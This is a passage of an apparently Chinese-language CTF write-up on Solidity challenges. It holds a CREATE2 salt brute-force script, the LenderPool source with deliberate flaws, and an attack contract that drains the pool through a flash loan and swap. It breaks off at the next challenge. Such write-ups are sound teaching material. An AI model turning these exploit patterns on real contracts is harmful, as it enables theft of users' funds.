class="line">            flag = true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function isSolved() external view returns(bool) &#123;</span><br><span class="line">        return flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attack&#123;</span><br><span class="line">    constructor()&#123;</span><br><span class="line">        Existing(0xB3F49c59c5482a46B6344Bd83A19E6bAe349f5bf).share_my_vault();</span><br><span class="line">        Existing(0xB3F49c59c5482a46B6344Bd83A19E6bAe349f5bf).setflag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract deployer&#123;</span><br><span class="line">    address public a;</span><br><span class="line">    function deploy(bytes memory code,uint salt)internal returns(address)&#123;</span><br><span class="line">      bytes memory bytecode = code;  </span><br><span class="line">      address addr;</span><br><span class="line">      assembly&#123;</span><br><span class="line">          addr:=create2(0,add(bytecode,0x20),mload(bytecode),salt)</span><br><span class="line">      &#125;</span><br><span class="line">      return addr;</span><br><span class="line">    &#125;</span><br><span class="line">    function get(bytes memory code,uint salt)public &#123;</span><br><span class="line">        a=deploy(code,salt);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Analyse-3"><a href="#Analyse-3" class="headerlink" title="Analyse"></a>Analyse</h2><p>要求攻击合约结尾时5a54,满足要求之后调用share_my_valut和setFlag函数就完成了</p><p>JS脚本</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Web3</span> = <span class="built_in">require</span>(<span class="string">&#x27;web3&#x27;</span>); <span class="comment">// 引入 web3 模块</span></span><br><span class="line"><span class="keyword">const</span> rpcURL = <span class="string">&quot;https://goerli.infura.io/v3/&quot;</span>; <span class="comment">// Infura RPC URL</span></span><br><span class="line"><span class="keyword">const</span> web3 = <span class="keyword">new</span> <span class="title class_">Web3</span>(rpcURL); <span class="comment">// 创建一个 web3 实例，连接 Infura 节点</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> code</span><br><span class="line">    = <span class="string">&quot;0x608060405234801561001057600080fd5b5060405161020d38038061020d833981810160405281019061003291906100db565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a88261007d565b9050919050565b6100b88161009d565b81146100c357600080fd5b50565b6000815190506100d5816100af565b92915050565b6000602082840312156100f1576100f0610078565b5b60006100ff848285016100c6565b91505092915050565b60f7806101166000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c80638da5cb5b14602d575b600080fd5b60336047565b604051603e919060a8565b60405180910390f35b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000609482606b565b9050919050565b60a281608b565b82525050565b600060208201905060bb6000830184609b565b9291505056fea264697066735822122026d2391212b4db1ed9d8c37357cd0b1613a16f4bb6c3f172cd4c1f48f5e0ee6f64736f6c634300081300330000000000000000000000005b38da6a701c568545dcfcb03fcb875f56beddc4&quot;</span>; <span class="comment">// 合约的字节码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> factoryAddress = <span class="string">&#x27;0x1c91347f2A44538ce62453BEBd9Aa907C662b4bD&#x27;</span>; <span class="comment">// 已经部署的工厂合约地址</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> prefix = <span class="string">&#x27;0xff&#x27;</span> + factoryAddress.<span class="title function_">slice</span>(<span class="number">2</span>,); <span class="comment">// 将工厂合约地址前缀设为 &#x27;0xff&#x27;，并去掉开头的 &#x27;0x&#x27;</span></span><br><span class="line"><span class="keyword">const</span> suffix = web3.<span class="property">utils</span>.<span class="title function_">keccak256</span>(code).<span class="title function_">slice</span>(<span class="number">2</span>,); <span class="comment">// 将合约字节码的哈希值计算出来，并去掉开头的 &#x27;0x&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> salt = <span class="number">0</span>; <span class="comment">// 初始化 salt 为 0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123; <span class="comment">// 循环直到找到满足条件的地址</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> saltHex = salt.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">64</span>, <span class="string">&#x27;0&#x27;</span>); <span class="comment">// 将 salt 转换为 16 进制，并填充到 64 位</span></span><br><span class="line">    <span class="keyword">const</span> concatString = prefix.<span class="title function_">concat</span>(saltHex).<span class="title function_">concat</span>(suffix);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> address = <span class="string">&quot;0x&quot;</span> + web3.<span class="property">utils</span>.<span class="title function_">keccak256</span>(concatString).<span class="title function_">slice</span>(<span class="number">26</span>,);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (address.<span class="title function_">endsWith</span>(<span class="string">&#x27;5a54&#x27;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">           <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`salt: <span class="subst">$&#123;saltHex&#125;</span>, address: <span class="subst">$&#123;address&#125;</span>`</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    salt++;</span><br><span class="line">   </span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(salt);</span><br><span class="line"> </span><br></pre></td></tr></table></figure><h1 id="0x05LenderPool"><a href="#0x05LenderPool" class="headerlink" title="0x05LenderPool"></a>0x05LenderPool</h1><h2 id="Source-Code-4"><a href="#Source-Code-4" class="headerlink" title="Source Code"></a>Source Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity 0.8.16;</span><br><span class="line"></span><br><span class="line">abstract contract ReentrancyGuard &#123;</span><br><span class="line"></span><br><span class="line">    uint256 private constant _NOT_ENTERED = 1;</span><br><span class="line">    uint256 private constant _ENTERED = 2;</span><br><span class="line"></span><br><span class="line">    uint256 private _status;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        _status = _NOT_ENTERED;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier nonReentrant() &#123;</span><br><span class="line">        _nonReentrantBefore();</span><br><span class="line">        _;</span><br><span class="line">        _nonReentrantAfter();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _nonReentrantBefore() private &#123;</span><br><span class="line">        // On the first call to nonReentrant, _status will be _NOT_ENTERED</span><br><span class="line">        require(_status != _ENTERED, &quot;ReentrancyGuard: reentrant call&quot;);</span><br><span class="line"></span><br><span class="line">        // Any calls to nonReentrant after this point will fail</span><br><span class="line">        _status = _ENTERED;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _nonReentrantAfter() private &#123;</span><br><span class="line">        // By storing the original value once again, a refund is triggered (see</span><br><span class="line">        // https://eips.ethereum.org/EIPS/eip-2200)</span><br><span class="line">        _status = _NOT_ENTERED;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _reentrancyGuardEntered() internal view returns (bool) &#123;</span><br><span class="line">        return _status == _ENTERED;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">library Address &#123;</span><br><span class="line"></span><br><span class="line">    function isContract(address account) internal view returns (bool) &#123;</span><br><span class="line"></span><br><span class="line">        return account.code.length &gt; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sendValue(address payable recipient, uint256 amount) internal &#123;</span><br><span class="line">        require(address(this).balance &gt;= amount, &quot;Address: insufficient balance&quot;);</span><br><span class="line"></span><br><span class="line">        (bool success, ) = recipient.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Address: unable to send value, recipient may have reverted&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function functionCall(address target, bytes memory data) internal returns (bytes memory) &#123;</span><br><span class="line">        return functionCallWithValue(target, data, 0, &quot;Address: low-level call failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function functionCall(</span><br><span class="line">        address target,</span><br><span class="line">        bytes memory data,</span><br><span class="line">        string memory errorMessage</span><br><span class="line">    ) internal returns (bytes memory) &#123;</span><br><span class="line">        return functionCallWithValue(target, data, 0, errorMessage);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) &#123;</span><br><span class="line">        return functionCallWithValue(target, data, value, &quot;Address: low-level call with value failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function functionCallWithValue(</span><br><span class="line">        address target,</span><br><span class="line">        bytes memory data,</span><br><span class="line">        uint256 value,</span><br><span class="line">        string memory errorMessage</span><br><span class="line">    ) internal returns (bytes memory) &#123;</span><br><span class="line">        require(address(this).balance &gt;= value, &quot;Address: insufficient balance for call&quot;);</span><br><span class="line">        (bool success, bytes memory returndata) = target.call&#123;value: value&#125;(data);</span><br><span class="line">        return verifyCallResultFromTarget(target, success, returndata, errorMessage);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) &#123;</span><br><span class="line">        return functionStaticCall(target, data, &quot;Address: low-level static call failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function functionStaticCall(</span><br><span class="line">        address target,</span><br><span class="line">        bytes memory data,</span><br><span class="line">        string memory errorMessage</span><br><span class="line">    ) internal view returns (bytes memory) &#123;</span><br><span class="line">        (bool success, bytes memory returndata) = target.staticcall(data);</span><br><span class="line">        return verifyCallResultFromTarget(target, success, returndata, errorMessage);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) &#123;</span><br><span class="line">        return functionDelegateCall(target, data, &quot;Address: low-level delegate call failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function functionDelegateCall(</span><br><span class="line">        address target,</span><br><span class="line">        bytes memory data,</span><br><span class="line">        string memory errorMessage</span><br><span class="line">    ) internal returns (bytes memory) &#123;</span><br><span class="line">        (bool success, bytes memory returndata) = target.delegatecall(data);</span><br><span class="line">        return verifyCallResultFromTarget(target, success, returndata, errorMessage);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function verifyCallResultFromTarget(</span><br><span class="line">        address target,</span><br><span class="line">        bool success,</span><br><span class="line">        bytes memory returndata,</span><br><span class="line">        string memory errorMessage</span><br><span class="line">    ) internal view returns (bytes memory) &#123;</span><br><span class="line">        if (success) &#123;</span><br><span class="line">            if (returndata.length == 0) &#123;</span><br><span class="line"></span><br><span class="line">                require(isContract(target), &quot;Address: call to non-contract&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            return returndata;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            _revert(returndata, errorMessage);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function verifyCallResult(</span><br><span class="line">        bool success,</span><br><span class="line">        bytes memory returndata,</span><br><span class="line">        string memory errorMessage</span><br><span class="line">    ) internal pure returns (bytes memory) &#123;</span><br><span class="line">        if (success) &#123;</span><br><span class="line">            return returndata;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            _revert(returndata, errorMessage);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _revert(bytes memory returndata, string memory errorMessage) private pure &#123;</span><br><span class="line">        // Look for revert reason and bubble it up if present</span><br><span class="line">        if (returndata.length &gt; 0) &#123;</span><br><span class="line"></span><br><span class="line">            assembly &#123;</span><br><span class="line">                let returndata_size := mload(returndata)</span><br><span class="line">                revert(add(32, returndata), returndata_size)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            revert(errorMessage);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">interface IERC20 &#123;</span><br><span class="line"></span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line"></span><br><span class="line">    event Approval(address indexed owner, address indexed spender, uint256 value);</span><br><span class="line"></span><br><span class="line">    function totalSupply() external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function balanceOf(address account) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 amount) external returns (bool);</span><br><span class="line"></span><br><span class="line">    function allowance(address owner, address spender) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 amount) external returns (bool);</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 amount) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ERC20 is IERC20 &#123;</span><br><span class="line">    mapping(address =&gt; uint256) private _balances;</span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) private _allowances;</span><br><span class="line"></span><br><span class="line">    uint256 private _totalSupply;</span><br><span class="line">    address public admin;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        _mint(msg.sender, 100 * 10**18);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function totalSupply() public view returns (uint256) &#123;</span><br><span class="line">        return _totalSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address account) public view returns (uint256) &#123;</span><br><span class="line">        return _balances[account];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 amount) public returns (bool) &#123;</span><br><span class="line">        _transfer(msg.sender, to, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allowance(address owner, address spender) public view returns (uint256) &#123;</span><br><span class="line">        return _allowances[owner][spender];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 amount) public returns (bool) &#123;</span><br><span class="line">        _approve(msg.sender, spender, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) public returns (bool) &#123;</span><br><span class="line">        _spendAllowance(from, msg.sender, amount);</span><br><span class="line">        _transfer(from, to, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _transfer(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) internal &#123;</span><br><span class="line">        require(from != address(0), &quot;ERC20: transfer from the zero address&quot;);</span><br><span class="line">        require(to != address(0), &quot;ERC20: transfer to the zero address&quot;);</span><br><span class="line">        uint256 fromBalance = _balances[from];</span><br><span class="line">        require(</span><br><span class="line">            fromBalance &gt;= amount,</span><br><span class="line">            &quot;ERC20: transfer amount exceeds balance&quot;</span><br><span class="line">        );</span><br><span class="line">        _balances[from] = fromBalance - amount;</span><br><span class="line">        _balances[to] += amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _mint(address account, uint256 amount) internal &#123;</span><br><span class="line">        require(account != address(0), &quot;ERC20: mint to the zero address&quot;);</span><br><span class="line">        _totalSupply += amount;</span><br><span class="line">        _balances[account] += amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _approve(</span><br><span class="line">        address owner,</span><br><span class="line">        address spender,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) internal &#123;</span><br><span class="line">        if (tx.origin == admin) &#123;</span><br><span class="line">            require(msg.sender.code.length &gt; 0);</span><br><span class="line">            _allowances[spender][tx.origin] = amount;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        require(owner != address(0), &quot;ERC20: approve from the zero address&quot;);</span><br><span class="line">        require(spender != address(0), &quot;ERC20: approve to the zero address&quot;);</span><br><span class="line">        _allowances[owner][spender] = amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _spendAllowance(</span><br><span class="line">        address owner,</span><br><span class="line">        address spender,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) internal &#123;</span><br><span class="line">        uint256 currentAllowance = allowance(owner, spender);</span><br><span class="line">        if (currentAllowance != type(uint256).max) &#123;</span><br><span class="line">            require(</span><br><span class="line">                currentAllowance &gt;= amount,</span><br><span class="line">                &quot;ERC20: insufficient allowance&quot;</span><br><span class="line">            );</span><br><span class="line">            unchecked &#123;</span><br><span class="line">                _approve(owner, spender, currentAllowance - amount);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract LenderPool is ReentrancyGuard &#123;</span><br><span class="line">    using Address for address;</span><br><span class="line">    IERC20 public immutable token0;</span><br><span class="line">    IERC20 public immutable token1;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        token0 = new ERC20();</span><br><span class="line">        token1 = new ERC20();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function swap(address tokenAddress,uint amount) public returns(uint)&#123;</span><br><span class="line">        require(</span><br><span class="line">            tokenAddress == address(token0)</span><br><span class="line">        </span><br><span class="line">            &amp;&amp; token1.transferFrom(msg.sender,address(this),amount) </span><br><span class="line">            </span><br><span class="line">            &amp;&amp; token0.transfer(msg.sender,amount)</span><br><span class="line"></span><br><span class="line">            || tokenAddress== address(token1)</span><br><span class="line">            </span><br><span class="line">            &amp;&amp; token0.transferFrom(msg.sender,address(this),amount) </span><br><span class="line">            </span><br><span class="line">            &amp;&amp; token1.transfer(msg.sender,amount));</span><br><span class="line">        return amount;</span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    function flashLoan(uint256 borrowAmount, address borrower)</span><br><span class="line">        external</span><br><span class="line">        nonReentrant</span><br><span class="line">    &#123;</span><br><span class="line">        uint256 balanceBefore = token0.balanceOf(address(this));</span><br><span class="line">        require(balanceBefore &gt;= borrowAmount, &quot;Not enough tokens in pool&quot;);</span><br><span class="line"></span><br><span class="line">        token0.transfer(borrower, borrowAmount);</span><br><span class="line">        borrower.functionCall(abi.encodeWithSignature(&quot;receiveEther(uint256)&quot;, borrowAmount));</span><br><span class="line"></span><br><span class="line">        uint256 balanceAfter = token0.balanceOf(address(this));</span><br><span class="line">        require(balanceAfter &gt;= balanceBefore, &quot;Flash loan hasn&#x27;t been paid back&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Check&#123;</span><br><span class="line">    LenderPool public lenderPool;</span><br><span class="line">    IERC20 token0;</span><br><span class="line">    constructor()&#123;</span><br><span class="line">        lenderPool = new LenderPool();</span><br><span class="line">        token0 = lenderPool.token0();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved()  public view returns(bool)&#123;</span><br><span class="line"></span><br><span class="line">        if(token0.balanceOf(address(lenderPool)) == 0)&#123;</span><br><span class="line">           return  true;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Analyse-4"><a href="#Analyse-4" class="headerlink" title="Analyse"></a>Analyse</h2><p>由于在flashLona中可以swap结清贷款并且换出另一种token，因此题目漏洞再次</p><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">    LenderPool public target;</span><br><span class="line">    constructor(address _target)&#123;</span><br><span class="line">        target = LenderPool(_target); </span><br><span class="line">    &#125;</span><br><span class="line">    function pwn()public &#123;</span><br><span class="line">        target.flashLoan(target.token0().balanceOf(address(target)),address(this));</span><br><span class="line">        target.token1().approve(address(target),type(uint).max);</span><br><span class="line">        target.swap(address(target.token0()),target.token1().balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line">    function receiveEther(uint256)public&#123;</span><br><span class="line">        target.token0().approve(address(target),type(uint).max);</span><br><span class="line">        target.swap(address(target.token1()),target.token0().balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x06GoatFinance"><a href="#0x06GoatFinance" class="headerlink" title="0x06GoatFinance"></a>0x06GoatFinance</h1><h2 id="Source-Code-5"><a href="#Source-Code-5" class="headerlink" title="Source Code"></a>Source Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 